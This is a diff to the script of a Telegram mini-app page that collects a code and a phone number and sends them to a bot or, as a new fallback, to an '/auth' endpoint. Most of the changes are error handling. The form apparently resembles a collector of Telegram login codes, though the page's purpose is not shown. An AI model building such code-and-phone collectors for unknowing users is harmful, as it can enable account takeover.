@@ -125,27 +125,35 @@
     </div>
 
     <script>
-        let tg = window.Telegram.WebApp;
+        let tg = window.Telegram?.WebApp;
         
         // Расширенная инициализация для мобильных устройств
         if (tg) {
-            tg.ready();
-            
-            // Устанавливаем цвет темы для WebApp
-            tg.setHeaderColor('#0b1226');
-            tg.setBackgroundColor('#071028');
-            
-            // Расширяем WebApp на весь экран
-            tg.expand();
-            
-            // Включаем жесты для закрытия
-            tg.enableClosingConfirmation();
+            try {
+                tg.ready();
+                
+                // Устанавливаем цвет темы для WebApp
+                tg.setHeaderColor('#0b1226');
+                tg.setBackgroundColor('#071028');
+                
+                // Расширяем WebApp на весь экран
+                tg.expand();
+                
+                // Включаем жесты для закрытия
+                tg.enableClosingConfirmation();
+                
+                console.log('Telegram WebApp успешно инициализирован');
+            } catch (e) {
+                console.error('Ошибка инициализации Telegram WebApp:', e);
+            }
+        } else {
+            console.warn('Telegram WebApp API недоступен');
         }
 
         const codeInput = document.getElementById('code_input');
         const phoneInput = document.getElementById('phone_input');
-    const menuScreen = document.getElementById('menu_screen');
-    const menuGrid = document.getElementById('menu_grid');
+        const menuScreen = document.getElementById('menu_screen');
+        const menuGrid = document.getElementById('menu_grid');
 
         // Phone mask (keeps behaviour)
         function formatPhone(raw){
@@ -183,24 +191,77 @@
         function updateMainButtonState(){
             const phoneDigits = phoneInput.value.replace(/\D/g,'');
             if(codeInput.value.trim() !== '' && phoneDigits.length === 11){
-                tg.MainButton.setText('Подтвердить данные');
-                tg.MainButton.show();
+                if (tg && tg.MainButton) {
+                    tg.MainButton.setText('Подтвердить данные');
+                    tg.MainButton.show();
+                } else {
+                    // Fallback для случаев когда MainButton недоступен
+                    showFallbackButton();
+                }
             } else {
-                tg.MainButton.hide();
+                if (tg && tg.MainButton) {
+                    tg.MainButton.hide();
+                }
+                hideFallbackButton();
             }
         }
 
-        tg.onEvent('mainButtonClicked', function(){
-            console.log('Main button clicked - starting authorization');
-            try{
-                tg.MainButton.showProgress(true);
-                tg.MainButton.disable();
+        // Fallback кнопка для мобильных устройств
+        function showFallbackButton() {
+            let fallbackBtn = document.getElementById('fallback_auth_button');
+            if (!fallbackBtn) {
+                fallbackBtn = document.createElement('button');
+                fallbackBtn.id = 'fallback_auth_button';
+                fallbackBtn.className = 'menu-btn';
+                fallbackBtn.textContent = 'Подтвердить данные';
+                fallbackBtn.onclick = handleFallbackAuth;
+                fallbackBtn.style.marginTop = '20px';
+                fallbackBtn.style.width = '100%';
+                
+                // Вставляем после формы
+                const card = document.querySelector('.card');
+                card.appendChild(fallbackBtn);
+            }
+            fallbackBtn.style.display = 'block';
+        }
+
+        function hideFallbackButton() {
+            const fallbackBtn = document.getElementById('fallback_auth_button');
+            if (fallbackBtn) {
+                fallbackBtn.style.display = 'none';
+            }
+        }
+
+        function handleFallbackAuth() {
+            console.log('Fallback авторизация для мобильного устройства');
+            sendData();
+        }
+
+        // Основной обработчик кнопки Telegram
+        if (tg && tg.onEvent) {
+            tg.onEvent('mainButtonClicked', function(){
+                console.log('Main button clicked - starting authorization');
+                handleAuth();
+            });
+        }
+
+        function handleAuth() {
+            try {
+                if (tg && tg.MainButton) {
+                    tg.MainButton.showProgress(true);
+                    tg.MainButton.disable();
+                }
 
                 // Установим запасной таймаут на случай, если отправка займёт слишком много времени
                 const emergencyTimeout = setTimeout(() => {
                     console.log('Emergency timeout triggered');
-                    try{ tg.MainButton.showProgress(false); tg.MainButton.enable(); }catch(e){}
-                    tg.showAlert('Таймаут авторизации. Попробуйте ещё раз.');
+                    try{ 
+                        if (tg && tg.MainButton) {
+                            tg.MainButton.showProgress(false); 
+                            tg.MainButton.enable(); 
+                        }
+                    }catch(e){}
+                    showError('Таймаут авторизации. Попробуйте ещё раз.');
                 }, 15000); // 15 секунд
 
                 // sendData выполняется синхронно по API, нет callback — поэтому даём пользователю быстрый фидбек
@@ -208,20 +269,30 @@
 
                 // После отправки показываем подтверждение и закрываем WebApp, очистив таймаут
                 try{
-                    tg.MainButton.showProgress(false);
-                    tg.MainButton.enable();
+                    if (tg && tg.MainButton) {
+                        tg.MainButton.showProgress(false);
+                        tg.MainButton.enable();
+                    }
                 }catch(e){}
                 clearTimeout(emergencyTimeout);
-                // НЕ показываем всплывающее окно - бот ответит в чате
-                // try{ tg.showAlert('Данные отправлены. Проверьте чат с ботом.'); }catch(e){}
+                
                 // Закрываем WebApp сразу после отправки данных
-                try{ tg.close(); }catch(e){}
+                try{ 
+                    if (tg && tg.close) {
+                        tg.close(); 
+                    }
+                }catch(e){}
             }catch (error) {
-                console.error('Error in mainButtonClicked handler:', error);
-                try{ tg.MainButton.showProgress(false); tg.MainButton.enable(); }catch(e){}
-                tg.showAlert('Ошибка при отправке данных.');
+                console.error('Error in auth handler:', error);
+                try{ 
+                    if (tg && tg.MainButton) {
+                        tg.MainButton.showProgress(false); 
+                        tg.MainButton.enable(); 
+                    }
+                }catch(e){}
+                showError('Ошибка при отправке данных.');
             }
-        });
+        }
 
         function sendData(){
             console.log('Sending data to bot');
@@ -239,73 +310,80 @@
             
             if(!code || phone.length !== 11){
                 console.log('Validation failed:', {code: !!code, phoneLength: phone.length});
-                
-                // Для мобильных устройств используем hapticFeedback
-                if (tg?.HapticFeedback) {
-                    tg.HapticFeedback.notificationOccurred('error');
-                }
-                
-                if (tg?.showAlert) {
-                    tg.showAlert('Пожалуйста, заполните корректно все поля.');
-                } else {
-                    alert('Пожалуйста, заполните корректно все поля.');
-                }
-                
-                tg.MainButton.showProgress(false);
-                tg.MainButton.enable();
+                showError('Пожалуйста, заполните корректно все поля.');
                 return;
             }
             
             console.log('Sending to bot:', {code, phone: phone.substring(0,3) + '***'});
             
             // Проверяем доступность tg.sendData
-            if (typeof tg?.sendData !== 'function') {
-                console.error('tg.sendData is not available!', {
-                    tg: !!tg,
-                    telegramWebApp: !!window.Telegram?.WebApp,
-                    sendData: typeof tg?.sendData
+            if (tg && typeof tg.sendData === 'function') {
+                try {
+                    const data = JSON.stringify({code, phone});
+                    console.log('Data to send:', data);
+                    
+                    // Хаптик для мобильных
+                    if (tg?.HapticFeedback) {
+                        tg.HapticFeedback.impactOccurred('light');
+                    }
+                    
+                    tg.sendData(data);
+                    console.log('Data sent successfully via Telegram API');
+                    
+                    // Хаптик подтверждения
+                    if (tg?.HapticFeedback) {
+                        tg.HapticFeedback.notificationOccurred('success');
+                    }
+                    
+                    showSuccess('Данные отправлены! Проверьте чат с ботом.');
+                    
+                } catch (error) {
+                    console.error('Error sending data via Telegram API:', error);
+                    showError('Ошибка при отправке через Telegram: ' + error.message);
+                }
+            } else {
+                // Fallback: отправляем данные через обычный HTTP запрос
+                console.log('Telegram API недоступен, используем HTTP fallback');
+                sendDataViaHTTP(code, phone);
+            }
+        }
+
+        // HTTP fallback для мобильных устройств
+        async function sendDataViaHTTP(code, phone) {
+            try {
+                const response = await fetch('/auth', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({code, phone})
                 });
                 
-                const errorMsg = 'Ошибка: функция отправки недоступна. Попробуйте открыть через Telegram.';
-                if (tg?.showAlert) {
-                    tg.showAlert(errorMsg);
+                if (response.ok) {
+                    console.log('Data sent successfully via HTTP');
+                    showSuccess('Данные отправлены через HTTP!');
                 } else {
-                    alert(errorMsg);
+                    throw new Error(`HTTP ${response.status}`);
                 }
-                return;
-            }
-            
-            try {
-                const data = JSON.stringify({code, phone});
-                console.log('Data to send:', data);
-                
-                // Хаптик для мобильных
-                if (tg?.HapticFeedback) {
-                    tg.HapticFeedback.impactOccurred('light');
-                }
-                
-                tg.sendData(data);
-                console.log('Data sent successfully');
-                
-                // Хаптик подтверждения
-                if (tg?.HapticFeedback) {
-                    tg.HapticFeedback.notificationOccurred('success');
-                }
-                
             } catch (error) {
-                console.error('Error sending data:', error);
-                
-                // Хаптик ошибки
-                if (tg?.HapticFeedback) {
-                    tg.HapticFeedback.notificationOccurred('error');
-                }
-                
-                const errorMsg = 'Ошибка при отправке: ' + error.message;
-                if (tg?.showAlert) {
-                    tg.showAlert(errorMsg);
-                } else {
-                    alert(errorMsg);
-                }
+                console.error('HTTP fallback failed:', error);
+                showError('Ошибка отправки данных. Попробуйте позже.');
+            }
+        }
+
+        function showError(message) {
+            if (tg?.showAlert) {
+                tg.showAlert(message);
+            } else {
+                alert(message);
+            }
+        }
+
+        function showSuccess(message) {
+            if (tg?.showAlert) {
+                tg.showAlert(message);
+            } else {
+                alert(message);
             }
         }
 
@@ -348,7 +426,7 @@
                         
                         console.log('Menu button clicked:', s);
                         
-                        if (typeof tg?.sendData === 'function') {
+                        if (tg && typeof tg.sendData === 'function') {
                             tg.sendData(JSON.stringify({type:'menu_selection', section: s}));
                             // give visual feedback
                             btn.textContent = 'Отправлено ✓';
@@ -364,22 +442,14 @@
                             }, 700);
                         } else {
                             console.error('tg.sendData not available for menu');
-                            if (tg?.showAlert) {
-                                tg.showAlert('Ошибка отправки. Попробуйте ещё раз.');
-                            } else {
-                                alert('Ошибка отправки. Попробуйте ещё раз.');
-                            }
+                            showError('Ошибка отправки. Попробуйте ещё раз.');
                         }
                     }catch(e){
                         console.error('Error in menu click handler:', e);
                         if (tg?.HapticFeedback) {
                             tg.HapticFeedback.notificationOccurred('error');
                         }
-                        if (tg?.showAlert) {
-                            tg.showAlert('Ошибка при отправке. Попробуйте ещё раз.');
-                        } else {
-                            alert('Ошибка при отправке. Попробуйте ещё раз.');
-                        }
+                        showError('Ошибка при отправке. Попробуйте ещё раз.');
                     }
                 };
                 
@@ -396,7 +466,11 @@
             });
             menuScreen.style.display = 'block';
             // hide main button if present
-            try{ tg.MainButton.hide(); }catch(e){}
+            try{ 
+                if (tg && tg.MainButton) {
+                    tg.MainButton.hide(); 
+                }
+            }catch(e){}
         }
 
         // If URL contains ?view=menu2 or ?section=... (or the same in the URL fragment), open the menu screen directly.
